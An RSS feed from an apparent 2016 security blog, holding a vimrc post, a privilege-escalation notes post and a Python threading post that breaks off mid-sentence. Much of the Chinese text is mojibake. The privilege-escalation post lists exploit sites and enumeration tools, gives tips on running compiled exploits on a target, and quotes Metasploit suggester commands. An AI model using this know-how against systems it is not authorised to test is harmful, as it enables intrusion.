<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="https://www.w3.org/2005/Atom">
  <channel>
    <title>quanyechavshuo</title>
    <description>A blog about programming and network security</description>
    <link>/</link>
    <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Sun, 25 Sep 2016 13:19:03 +0800</pubDate>
    <lastBuildDate>Sun, 25 Sep 2016 13:19:03 +0800</lastBuildDate>
    <generator>Jekyll v3.1.6</generator>
    
      <item>
        <title>test for somethig</title>
        <description>&lt;p&gt;this is a test for&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hello who areyou
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sun, 25 Sep 2016 00:00:00 +0800</pubDate>
        <link>/test/2016/09/25/test-for-somethig/</link>
        <guid isPermaLink="true">/test/2016/09/25/test-for-somethig/</guid>
        
        <category>test</category>
        
        
        <category>test</category>
        
      </item>
    
      <item>
        <title>vimrc</title>
        <description>&lt;h4 id=&quot;spf13-vim&quot;&gt;1&amp;gt;å¼ƒç”¨spf13-vim&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a)æ’ä»¶è¿‡å¤š
b)ä¸åˆ©äºæŒæ¡vim
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;vimrc&quot;&gt;2&amp;gt;.vimrc&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;ä¸‹é¢è¿™æ®µæ˜¯vundleè¦æ±‚çš„,åŠ åˆ°vimrcçš„å¼€å¤´
&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;for vundle&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
set nocompatible              &quot; be iMproved, required 
filetype off                  &quot; required

&quot; set the runtime path to include Vundle and initialize
set rtp+=~/.vim/bundle/Vundle.vim
call vundle#begin()
&quot; alternatively, pass a path where Vundle should install plugins &quot;call vundle#begin(&#39;~/some/path/here&#39;)
&quot; let Vundle manage Vundle, required
Plugin &#39;VundleVim/Vundle.vim&#39;
&quot; The following are examples of different formats supported.
&quot; Keep Plugin commands between vundle#begin/end.
&quot; plugin on GitHub repo
Plugin &#39;tpope/vim-fugitive&#39;
&quot;ä¸‹é¢ç”¨vundleå®‰è£…incsearchæ’ä»¶
Plugin &#39;haya14busa/incsearch.vim&#39;
&quot;ä¸‹é¢ç”¨vundleå®‰è£…incsearch-fuzzyæ’ä»¶
Plugin &#39;haya14busa/incsearch-fuzzy.vim&#39;
&quot;ä¸‹é¢ç”¨vundleå®‰è£…easymotionæ’ä»¶
Plugin &#39;easymotion/vim-easymotion&#39;
&quot;ä¸‹é¢ç”¨vundleå®‰è£…incsearch-easymotion&amp;lt;space+/&amp;gt;,&amp;lt;z+/&amp;gt;
Plugin &#39;haya14busa/incsearch-easymotion.vim&#39;
&quot;ä¸‹é¢ç”¨vundleå®‰è£…autoformatä»£ç è‡ªåŠ¨å¯¹é½æ’ä»¶&amp;lt;f3&amp;gt;
Plugin &#39;Chiel92/vim-autoformat&#39;
&quot;ä¸‹é¢ç”¨vundleå®‰è£…auto-pairsæ‹¬å·è‡ªåŠ¨é…å¯¹æ’ä»¶
Plugin &#39;jiangmiao/auto-pairs&#39;
&quot;ä¸‹é¢ç”¨vundleå®‰è£…Valloric/YouCompleteMeæ’ä»¶
Plugin &#39;Valloric/YouCompleteMe&#39;
&quot;ä¸‹é¢ç”¨vundleå®‰è£…indentLineä»£ç å¯¹é½çº¿æ’ä»¶
Plugin &#39;Yggdroot/indentLine&#39;
&quot;ä¸‹é¢ç”¨vundleå®‰è£…vimä¸­æ–‡æ–‡æ¡£
Plugin &#39;vimcn/vimcdoc&#39;
&quot;ä¸‹é¢ç”¨vundleå®‰è£…ctrlpå¿«é€Ÿæ‰“å¼€æ–‡ä»¶æ’ä»¶,&amp;lt;c-p&amp;gt;
Plugin &#39;ctrlpvim/ctrlp.vim&#39;
&quot;ä¸‹é¢ç”¨vundleå®‰è£…é…è‰²æ’ä»¶
Plugin &#39;flazz/vim-colorschemes&#39;
&quot;ä¸‹é¢è¿™ä¸ªæ’ä»¶ç”¨æ¥å¿«é€Ÿåˆ‡æ¢é…è‰²&amp;lt;f8&amp;gt;
Plugin &#39;felixhummel/setcolors.vim&#39;
&quot; plugin from http://vim-scripts.org/vim/scripts.html
&quot;Plugin &#39;L9&#39;

&quot; Git plugin not hosted on GitHub
&quot;Plugin &#39;git://git.wincent.com/command-t.git&#39;

&quot; git repos on your local machine (i.e. when working on your own plugin)
&quot;Plugin &#39;file:///home/gmarik/path/to/plugin&#39;

&quot; The sparkup vim script is in a subdirectory of this repo called vim.
&quot; Pass the path to set the runtimepath properly.
Plugin &#39;rstacruz/sparkup&#39;, {&#39;rtp&#39;: &#39;vim/&#39;}

&quot; Install L9 and avoid a Naming conflict if you&#39;ve already installed a
&quot; different version somewhere else.
Plugin &#39;ascenator/L9&#39;, {&#39;name&#39;: &#39;newL9&#39;}

&quot; All of your Plugins must be added before the following line
call vundle#end()            &quot; required

&quot;ä¸‹é¢è¿™è¡Œè¦æ³¨æ„,æœ‰å¯èƒ½ä»¥åè¦æ”¹
filetype plugin indent on    &quot; required
&quot; To ignore plugin indent changes, instead use:
&quot;filetype plugin on
&quot;
&quot; Brief help
&quot; :PluginList       - lists configured plugins
&quot; :PluginInstall    - installs plugins; append `!` to update or just :PluginUpdate
&quot; :PluginSearch foo - searches for foo; append `!` to refresh local cache
&quot; :PluginClean      - confirms removal of unused plugins; append `!` to auto-approve removal
&quot;
&quot; see :h vundle for more details or wiki for FAQ
&quot; Put your non-Plugin stuff after this line

&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;for vundle end&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;




&quot;set ruler|noruler&quot;é»˜è®¤å¼€å¯ruler
&quot;è®¾ç½®leaderé”®ä¸º,
let mapleader=&quot;,&quot;
set number&quot;æ˜¾ç¤ºè¡Œå·
syntax on&quot;è‡ªåŠ¨è¯­æ³•é«˜äº®,è¯­æ³•æ£€éªŒ
set autoindent&quot;è‡ªåŠ¨ç¼©è¿›
set tabstop=4&quot;tabé”®å 4ä¸ªå­—ç¬¦

&quot;å¿«é€Ÿåˆ‡æ¢åˆ°æ­£å¸¸æ¨¡å¼
imap fj &amp;lt;esc&amp;gt;
imap jf &amp;lt;esc&amp;gt;
cmap fj &amp;lt;esc&amp;gt;
cmap jf &amp;lt;esc&amp;gt;
vmap fj &amp;lt;esc&amp;gt;
vmap jf &amp;lt;esc&amp;gt;

&quot;æ–¹ä¾¿æ“ä½œ
map ; :
map &amp;lt;s-;&amp;gt; ;
map mm ZZ
map sy &quot;+y
map sp &quot;+p

&quot;mdæ–‡ä»¶ä¸­æ–‡ç¬¦å·æ¢æˆè‹±æ–‡
au BufRead *.md call Biaodian() &amp;lt;CR&amp;gt;
map &amp;lt;F2&amp;gt; :call Biaodian() &amp;lt;CR&amp;gt;
function Biaodian()
    %s/â€œ/&quot;/g
    %s/â€/&quot;/g
    %s/ï¼Œ/,/g
    %s/ã€‚/./g
    %s/ï¼Ÿ/?/g
    %s/ã€ˆ/&amp;lt;/g
    %s/ã€‰/&amp;gt;/g
    %s/ï¼ˆ/(/g
    %s/ï¼‰/)/g
    %s/ï¼š/:/g
    %s/ï¼›/;/g
    %s/â€˜/&#39;/g
    %s/â€˜/&#39;/g
    %s/ï¼/!/g
    endfunction

&quot;111å­—ç¬¦é•¿åº¦æ¢è¡Œç”¨æ¥é€‚é…åšå®¢mdç¼–å†™
set textwidth=111

&quot;textwidthç”¨äºä¸­æ–‡æ¢è¡Œ
set formatoptions+=mM

&quot;æ¯è¡Œè¶…è¿‡111å­—ç¬¦é•¿åº¦åç”¨ä¸åŒé¢œè‰²æ˜¾ç¤º
augroup vimrc_autocmds
  autocmd BufEnter * highlight OverLength ctermbg=darkgrey guibg=#592929
  autocmd BufEnter * match OverLength /\%112v.*/
augroup END

&quot;è®¾ç½®,wä¸ºä¿å­˜
nmap &amp;lt;leader&amp;gt;w :w&amp;lt;CR&amp;gt;


&quot;ä¸‹é¢4ä¸ªæ’ä»¶æœ€åæµ“ç¼©æˆçš„ä¸¤ä¸ªå…¸å‹ä½¿ç”¨æ–¹æ³•:
&quot;space+/:fuzz search+easymotionåŠŸèƒ½
&quot;z/:fuzz searchåŠŸèƒ½
&quot;
&quot;å››ä¸ªeasymotionæ’ä»¶incsearch incsearch-fuzzy vim-easymotion incsearch-easymotionç›¸å…³è®¾ç½®
&quot;ç›®å‰åªèƒ½ç”¨incsearchå’Œeasymotion,å¹¶ç”¨å¦‚ä¸‹é…ç½®

&quot;111111incsearchæ’ä»¶è®¾ç½®
&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;start of incsearch&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
map /  &amp;lt;Plug&amp;gt;(incsearch-forward)
map ?  &amp;lt;Plug&amp;gt;(incsearch-backward)
map g/ &amp;lt;Plug&amp;gt;(incsearch-stay)

set hlsearch
let g:incsearch#auto_nohlsearch = 1
map n  &amp;lt;Plug&amp;gt;(incsearch-nohl-n)
map N  &amp;lt;Plug&amp;gt;(incsearch-nohl-N)
map *  &amp;lt;Plug&amp;gt;(incsearch-nohl-*)
map #  &amp;lt;Plug&amp;gt;(incsearch-nohl-#)
map g* &amp;lt;Plug&amp;gt;(incsearch-nohl-g*)
map g# &amp;lt;Plug&amp;gt;(incsearch-nohl-g#)

function! s:noregexp(pattern) abort
	return &#39;\V&#39; . escape(a:pattern, &#39;\&#39;)
endfunction

function! s:config() abort
	return {&#39;converters&#39;: [function(&#39;s:noregexp&#39;)]}
endfunction

noremap &amp;lt;silent&amp;gt;&amp;lt;expr&amp;gt; z/ incsearch#go(&amp;lt;SID&amp;gt;config())
&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;end of incsearch&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;



&quot;222222incsearch-fuzzyæ’ä»¶è®¾ç½®
&quot;https://github.com/haya14busa/incsearch-fuzzy.vim
&quot;æš‚æ—¶å› ä¸ºçœ‹ä¸Šå»æ²¡æœ‰ä»€ä¹ˆæ•ˆæœè€Œæ²¡ç”¨å®ƒ,æš‚æ—¶è®¤ä¸º222222å’Œ333333è¿™ä¸¤ä¸ªæ’ä»¶æ— æ³•æ­£å¸¸å·¥ä½œæ˜¯ç”±äº222222æ’ä»¶æ— æ³•æ­£å¸¸å·¥ä½œ
&quot;è€Œ222222ä¸å·¥ä½œæ˜¯ç”±äºæ²¡æœ‰æ‰¾åˆ°incsearch#config#fuzzy#converter()å‡½æ•°(æŠ¥è¿™ä¸ªé”™),äºæ˜¯vim--&amp;gt;:h
&quot;incsearch-config-fuzzy,å‘ç°æ²¡æœ‰incsearch-config-fuzzyçš„è¯´æ˜,çŒœæƒ³æœ‰ä¸€ç‚¹å¯èƒ½æ˜¯incsearch-fuzzyæ’ä»¶æ²¡æœ‰è£…å¥½,äºæ˜¯
&quot;:BundleInstall,å±…ç„¶å¯ä»¥å®‰è£…,è¯´æ˜ä¹‹å‰è¿™ä¸ªincsearch-fuzzyæ’ä»¶çš„ç¡®æ²¡æœ‰è£…å¥½,ç„¶åå‘ç°å®‰è£…å®Œincsearch-fuzzyåå°±ä¸ä¼š
&quot;æŠ¥æ²¡æœ‰æ‰¾åˆ°incsearch#config#fuzzy#converter()å‡½æ•°çš„é”™è¯¯äº†,ç„¶åä¸€åˆ‡éƒ½å¥½äº†,333333æ’ä»¶ä¹Ÿå¯ä»¥ç”¨äº†
&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;start of incsearch-fuzzy&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
&quot;fuzzy
map z/ &amp;lt;Plug&amp;gt;(incsearch-fuzzy-/)
map z? &amp;lt;Plug&amp;gt;(incsearch-fuzzy-?)
map zg/ &amp;lt;Plug&amp;gt;(incsearch-fuzzy-stay)
&quot;fuzzyspell
map z/ &amp;lt;Plug&amp;gt;(incsearch-fuzzyspell-/)
map z? &amp;lt;Plug&amp;gt;(incsearch-fuzzyspell-?)
map zg/ &amp;lt;Plug&amp;gt;(incsearch-fuzzyspell-stay)
&quot;Use both fuzzy &amp;amp; fuzzyspell feature
function! s:config_fuzzyall(...) abort
		  return extend(copy({
		    \   &#39;converters&#39;: [
		    \     incsearch#config#fuzzy#converter(),
		    \     incsearch#config#fuzzyspell#converter()
		    \   ],
		    \ }), get(a:, 1, {}))
endfunction

noremap &amp;lt;silent&amp;gt;&amp;lt;expr&amp;gt; z/ incsearch#go(&amp;lt;SID&amp;gt;config_fuzzyall())
noremap &amp;lt;silent&amp;gt;&amp;lt;expr&amp;gt; z? incsearch#go(&amp;lt;SID&amp;gt;config_fuzzyall({&#39;command&#39;: &#39;?&#39;}))
noremap &amp;lt;silent&amp;gt;&amp;lt;expr&amp;gt; zg? incsearch#go(&amp;lt;SID&amp;gt;config_fuzzyall({&#39;is_stay&#39;: 1}))
&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;end of incsearch-fuzzy&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;


&quot;333333incsearch-easymotionæ’ä»¶çš„è®¾ç½®
&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;start of incsearch-easymotion&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
&quot;https://github.com/haya14busa/incsearch-easymotion.vim
&quot;æš‚æ—¶å› ä¸ºæ²¡æœ‰ä»€ä¹ˆæ•ˆæœè€Œæ²¡ç”¨å®ƒ,å¯èƒ½æ˜¯ä¸ä»€ä¹ˆæ’ä»¶ä¸å…¼å®¹æˆ–ä¸ç³»ç»Ÿä¸å…¼å®¹
&quot;åæ¥å¯ä»¥ç”¨äº†,å› ä¸ºä¸Šé¢çš„incsearch-fuzzyæ’ä»¶ç¬¬ä¸€æ¬¡æ²¡æœ‰è£…å¥½
&quot;map z/ &amp;lt;Plug&amp;gt;(incsearch-easymotion-/)
&quot;map z? &amp;lt;Plug&amp;gt;(incsearch-easymotion-?)
&quot;map zg/ &amp;lt;Plug&amp;gt;(incsearch-easymotion-stay)
&quot;ä¸Šé¢è¿™ä¸‰è¡Œä¸èƒ½åŠ ,åŠ äº†åˆ™ä¸èƒ½é€šè¿‡z/æ¥fuzz searchäº†,å¦‚æœåŠ äº†ä¸Šé¢è¿™ä¸‰è¡Œ,æ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šæ•ˆæœ
&quot;æ— è®ºæœ‰æ²¡æœ‰åŠ ä¸Šé¢è¿™ä¸‰è¡Œ,éƒ½å¯ä»¥é€šè¿‡space+/å®ç°[fuzz searchå¹¶easymotionçš„æ•ˆæœ]

&quot;&quot;&quot;incsearch.vim x fuzzy x vim-easymotion
function! s:config_easyfuzzymotion(...) abort
		  return extend(copy({
		    \   &#39;converters&#39;: [incsearch#config#fuzzy#converter()],
		    \   &#39;modules&#39;: [incsearch#config#easymotion#module()],
		    \   &#39;keymap&#39;: {&quot;\&amp;lt;CR&amp;gt;&quot;: &#39;&amp;lt;Over&amp;gt;(easymotion)&#39;},
		    \   &#39;is_expr&#39;: 0,
		    \   &#39;is_stay&#39;: 1
		    \ }), get(a:, 1, {}))
endfunction
noremap &amp;lt;silent&amp;gt;&amp;lt;expr&amp;gt; &amp;lt;Space&amp;gt;/ incsearch#go(&amp;lt;SID&amp;gt;config_easyfuzzymotion())
&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;end of incsearch-easymotion&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;


&quot;444444ä¸‹é¢æ˜¯easymotionæ’ä»¶çš„ç›¸å…³è®¾ç½®
&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;start of easymotion&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
&quot;ä¸‹é¢è¿™å¥æš‚æ—¶ä¸ç¡®å®šç”¨æ„
let g:EasyMotion_do_mapping = 0 &quot; Disable default mappings
&quot;ä¸‰é”®åˆ°ä»»æ„åœ°æ–¹
nmap s &amp;lt;Plug&amp;gt;(easymotion-overwin-f)
&quot;å››é”®åˆ°ä»»æ„åœ°æ–¹
&quot;nmap s &amp;lt;Plug&amp;gt;(easymotion-overwin-f2)
&quot;è®¾ç½®å¤§å°å†™ä¸æ•æ„Ÿ
let g:EasyMotion_smartcase = 1
&quot; JK motions: Line motions
map &amp;lt;Leader&amp;gt;j &amp;lt;Plug&amp;gt;(easymotion-j)
map &amp;lt;Leader&amp;gt;k &amp;lt;Plug&amp;gt;(easymotion-k)
&quot;move to line 
map &amp;lt;Leader&amp;gt;l &amp;lt;Plug&amp;gt;(easymotion-bd-jk)
nmap &amp;lt;Leader&amp;gt;l &amp;lt;Plug&amp;gt;(easymotion-overwin-line)

&quot;ä¸‹é¢è®¾ç½®fuzzsearch,è¿™ä¸ªæœ‰ç‚¹å¼,ç»“åˆincsearch,incsearch-fuzzy,easymotion,incsearch-easymotionå››ä¸ªæ’ä»¶
&quot;ä½†æ˜¯ç›®å‰å¹¶æ²¡æœ‰è®©4ä¸ªæ’ä»¶éƒ½èµ·ä½œç”¨
&quot;ç›®å‰åªæœ‰incsearch+easymotion
&quot;åæ¥è¿™å››ä¸ªæ’ä»¶å®Œç¾è¿è¡Œäº†,å› ä¸ºincsearch-fuzzyæ’ä»¶ä¹‹å‰æ²¡æœ‰è£…å¥½
&quot;incsearch-fuzzyå’Œincsearch-easymotionè¿™ä¸¤ä¸ªæ’ä»¶æš‚æ—¶æ²¡æœ‰ç”¨
&quot; You can use other keymappings like &amp;lt;C-l&amp;gt; instead of &amp;lt;CR&amp;gt; if you want to
&quot; use these mappings as default search and somtimes want to move cursor with
&quot; EasyMotion.

function! s:incsearch_config(...) abort
		  return incsearch#util#deepextend(deepcopy({
		    \   &#39;modules&#39;: [incsearch#config#easymotion#module({&#39;overwin&#39;: 1})],
		    \   &#39;keymap&#39;: {
		    \     &quot;\&amp;lt;CR&amp;gt;&quot;: &#39;&amp;lt;Over&amp;gt;(easymotion)&#39;
		    \   },
		    \   &#39;is_expr&#39;: 0
		    \ }), get(a:, 1, {}))
endfunction

noremap &amp;lt;silent&amp;gt;&amp;lt;expr&amp;gt; /  incsearch#go(&amp;lt;SID&amp;gt;incsearch_config())
noremap &amp;lt;silent&amp;gt;&amp;lt;expr&amp;gt; ?  incsearch#go(&amp;lt;SID&amp;gt;incsearch_config({&#39;command&#39;: &#39;?&#39;}))
noremap &amp;lt;silent&amp;gt;&amp;lt;expr&amp;gt; g/ incsearch#go(&amp;lt;SID&amp;gt;incsearch_config({&#39;is_stay&#39;: 1}))
&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;end of easymotion&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;

&quot;ä»£ç å¯¹é½æ’ä»¶ç›¸å…³è®¾ç½®
noremap &amp;lt;F3&amp;gt; :Autoformat&amp;lt;CR&amp;gt;

&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;start of YCM&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
&quot;YouCompleteMeç›¸å…³è®¾ç½®
set runtimepath+=~/.vim/bundle/YouCompleteMe
let g:ycm_collect_identifiers_from_tags_files = 1           &quot; å¼€å¯ YCM åŸºäºæ ‡ç­¾å¼•æ“
let g:ycm_collect_identifiers_from_comments_and_strings = 1 &quot; æ³¨é‡Šä¸å­—ç¬¦ä¸²ä¸­çš„å†…å®¹ä¹Ÿç”¨äºè¡¥å…¨
let g:syntastic_ignore_files=[&quot;.*\.py$&quot;]
let g:ycm_seed_identifiers_with_syntax = 1                  &quot; è¯­æ³•å…³é”®å­—è¡¥å…¨
let g:ycm_complete_in_comments = 1
let g:ycm_confirm_extra_conf = 0
let g:ycm_key_list_select_completion = [&#39;&amp;lt;c-n&amp;gt;&#39;, &#39;&amp;lt;Down&amp;gt;&#39;]  &quot; æ˜ å°„æŒ‰é”®, æ²¡æœ‰è¿™ä¸ªä¼šæ‹¦æˆªæ‰tab, å¯¼è‡´å…¶ä»–æ’ä»¶çš„tabä¸èƒ½ç”¨.
let g:ycm_key_list_previous_completion = [&#39;&amp;lt;c-p&amp;gt;&#39;, &#39;&amp;lt;Up&amp;gt;&#39;]
let g:ycm_complete_in_comments = 1                          &quot; åœ¨æ³¨é‡Šè¾“å…¥ä¸­ä¹Ÿèƒ½è¡¥å…¨
let g:ycm_complete_in_strings = 1                           &quot; åœ¨å­—ç¬¦ä¸²è¾“å…¥ä¸­ä¹Ÿèƒ½è¡¥å…¨
let g:ycm_collect_identifiers_from_comments_and_strings = 1 &quot; æ³¨é‡Šå’Œå­—ç¬¦ä¸²ä¸­çš„æ–‡å­—ä¹Ÿä¼šè¢«æ”¶å…¥è¡¥å…¨
let g:ycm_global_ycm_extra_conf=&#39;~/.vim/bundle/YouCompleteMe/third_party/ycmd/cpp/ycm/.ycm_extra_conf.py&#39;
let g:ycm_show_diagnostics_ui = 0                           &quot; ç¦ç”¨è¯­æ³•æ£€æŸ¥
inoremap &amp;lt;expr&amp;gt; &amp;lt;CR&amp;gt; pumvisible() ? &quot;\&amp;lt;C-y&amp;gt;&quot; : &quot;\&amp;lt;CR&amp;gt;&quot; |            &quot; å›è½¦å³é€‰ä¸­å½“å‰é¡¹
nnoremap &amp;lt;c-j&amp;gt; :YcmCompleter GoToDefinitionElseDeclaration&amp;lt;CR&amp;gt;|     &quot; è·³è½¬åˆ°å®šä¹‰å¤„
&quot;let g:ycm_min_num_of_chars_for_completion=2                 &quot; ä»ç¬¬2ä¸ªé”®å…¥å­—ç¬¦å°±å¼€å§‹ç½—åˆ—åŒ¹é…é¡¹
&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;end of YCM&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;

&quot;vim-colorschemesæ’ä»¶é…è‰²
colorscheme molokai 
&quot;setcolorsæ’ä»¶è®¾ç½®è‡ªåŠ¨æ¢é…è‰²,vim-colorschemesæ’ä»¶ç›¸å½“äºé…è‰²åº“,setcoloræ’ä»¶ç”¨äºå˜æ¢å…¶ä»–é…è‰²,å¦‚æœä¸å®‰è£…
&quot;vim-colorschemesæ’ä»¶åªå®‰è£…setcoloræ’ä»¶åˆ™æ²¡æœ‰å¥½çš„æ•ˆæœ
autocmd CursorHold * call NextColor(1)
&quot;åœ¨setcolors.vimä¸­å°†æœ€å¼€å§‹çš„è®¾ç½®æ”¹æˆå¦‚ä¸‹å€¼
&quot;let s:mycolors = [&#39;Benokai&#39;,&#39;molokai&#39;,&#39;evening&#39;, &#39;feral&#39;, &#39;flatlandia&#39;, &#39;flattown&#39;, &#39;murphy&#39;, &#39;flatui&#39;, &#39;freya&#39;, &#39;fu&#39;,&#39;genericdc&#39;,&#39;1989&#39;,&#39;256-grayvim&#39;,&#39;256-jungle&#39;,&#39;CandyPaper&#39;,&#39;Chasing_Logic&#39;,&#39;ChocolateLiquor&#39;,&#39;ChocolatePapaya&#39;,&#39;openbsd&#39;,&#39;BlackSea&#39;,&#39;black_angus&#39;,&#39;0x7A69-dark&#39;]  &quot; colorscheme names that we use to set color

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sat, 24 Sep 2016 00:00:00 +0800</pubDate>
        <link>/vim/2016/09/24/vimrc/</link>
        <guid isPermaLink="true">/vim/2016/09/24/vimrc/</guid>
        
        <category>vimrc</category>
        
        
        <category>vim</category>
        
      </item>
    
      <item>
        <title>ææƒ</title>
        <description>&lt;h3 id=&quot;x00-linux&quot;&gt;0x00 linux&lt;/h3&gt;

&lt;h4 id=&quot;links&quot;&gt;1&amp;gt;links&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.https://www.kernel-exploits.com
2.http://hackforums.net/showthread.php?tid=3970076
3.http://exploit.linuxnote.org/
4.https://itunsecurity.wordpress.com/2015/08/16/vulnhub-com-writeup-darknet/(LinEnum.sh,linuxprivchecker.py,
  unix-privesc-check)
    LinEnum.sh
        https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
    linuxprivchecker.py
        http://www.securitysift.com/download/linuxprivchecker.py
    unix-privesc-check
        http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz
5.https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/?redirect
6.https://www.youtube.com/watch?v=XEZxUCayKxY
    http://thekidsmagic.com/watch/e9tX1JvhwhM/internal-server-error-symlink-bypass-2016-by-sen-haxor
    https://junookyo.blogspot.com/2013/06/bypass-symlink-on-linux-servers-by-sen-hacker.html
    phpä¸­bypass symlink,bypass forbidden,bypass safe mode
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;section&quot;&gt;2&amp;gt;ç¬”è®°&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;linuxææƒæ—¶,ç¼–è¯‘exploit.cæ–‡ä»¶æ—¶å¿…é¡»åœ¨å¯¹æ–¹ç³»ç»Ÿä¸­ç¼–è¯‘,æˆ–è€…ä¸å¯¹æ–¹ç³»ç»Ÿä¸€æ ·çš„ç³»ç»Ÿä¸­ç¼–è¯‘,å¦åˆ™æœ¬åœ°ç¼–è¯‘å‡ºexploitæ–‡ä»¶å
  ä¸Šä¼ åˆ°å¯¹æ–¹æœºå™¨è¿è¡Œæ—¶ä¼šå‡ºç°can not execute binary fileçš„é”™è¯¯
2&amp;gt;æ‰§è¡Œexpæ—¶å‡ºç°permission deniedçš„é—®é¢˜
    a)expæ²¡æœ‰+xæƒé™,è§£å†³æ–¹æ³•:chmod +x exp
    b)æ²¡æœ‰expä¸­çš„è§£é‡Šå™¨shellçš„æ‰§è¡Œæƒé™,è§£å†³æ–¹æ³•:æ¢ä¸€ä¸ªè§£é‡Šå™¨
    https://www.ibm.com/developerworks/cn/aix/library/au-unixerrors/
3&amp;gt;linuxä¸åŒç‰ˆæœ¬å†…æ ¸ä¸‹è½½
    https://www.kernel.org/pub/linux/kernel
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01-windows&quot;&gt;0x01 windows&lt;/h3&gt;

&lt;h4 id=&quot;links-1&quot;&gt;1&amp;gt;links&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.https://github.com/GDSSecurity/Windows-Exploit-Suggester
2.http://www.52wa.net/post-198.html
3.http://le4f.net/post/post/windows-x64-local-privilege-escalation
4.https://forum.90sec.org/forum.php?mod=viewthread&amp;amp;tid=9067#lastpost
5.https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
6.http://www.freebuf.com/articles/web/76892.html
7.https://github.com/foxglovesec/Potato
8.in meterpreter:
    meterpreter&amp;gt;background
    msf&amp;gt;use post/multi/recon/local_exploit_suggester 
    msf&amp;gt;show options
    msf&amp;gt;exploit
    or  
    meterpreter&amp;gt;run post/multi/recon/local_exploit_suggester
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sun, 18 Sep 2016 00:00:00 +0800</pubDate>
        <link>/local/exploit/2016/09/18/linux%E6%8F%90%E6%9D%83/</link>
        <guid isPermaLink="true">/local/exploit/2016/09/18/linux%E6%8F%90%E6%9D%83/</guid>
        
        <category>web</category>
        
        <category>local</category>
        
        <category>exploit</category>
        
        
        <category>local</category>
        
        <category>exploit</category>
        
      </item>
    
      <item>
        <title>pythonå¤šè¿›ç¨‹å¤šçº¿ç¨‹</title>
        <description>&lt;h3 id=&quot;x01-python&quot;&gt;0x01 ä¸ºä»€ä¹ˆæœ‰äººè¯´Pythonçš„å¤šçº¿ç¨‹æ˜¯é¸¡è‚‹&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;å·®ä¸å¤šæ˜¯è¿™æ ·å­.å¤šçº¿ç¨‹ç›®å‰ä»…ç”¨äºç½‘ç»œå¤šçº¿ç¨‹é‡‡é›†, ä»¥åŠæ€§èƒ½æµ‹è¯•.
å…¶å®ƒçš„è¯­è¨€ä¹Ÿæœ‰ç±»ä¼¼çš„æƒ…å†µ,çº¿ç¨‹æœ¬èº«çš„ç‰¹ç‚¹å¯¼è‡´çº¿ç¨‹çš„é€‚ç”¨èŒƒå›´æ˜¯å—é™çš„.åªæœ‰CPUè¿‡å‰©,è€Œå…¶å®ƒçš„ä»»åŠ¡å¾ˆæ…¢,æ­¤æ—¶ç”¨çº¿ç¨‹æ‰æ˜¯æœ‰
